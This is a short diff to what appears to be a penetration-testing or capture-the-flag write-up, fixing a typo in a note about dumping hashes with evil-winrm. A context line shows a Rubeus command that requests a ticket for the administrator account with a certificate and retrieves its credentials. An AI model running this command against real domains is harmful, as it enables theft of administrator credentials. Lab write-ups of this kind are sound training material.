@@ -191,5 +191,5 @@ Nmap done: 1 IP address (1 host up) scanned in 102.84 seconds
 ![](./images/21.png)
 ![](./images/22.png)
 
-- Note: Looks like there was a way to do dump the hashes from `evil-winrm`
+- Note: Looks like there was a way to dump the hashes from `evil-winrm`
   - `.\Rubeus.exe asktgt /user:administrator /certificate:<Certificate> /getcredentials /show /nowrap`
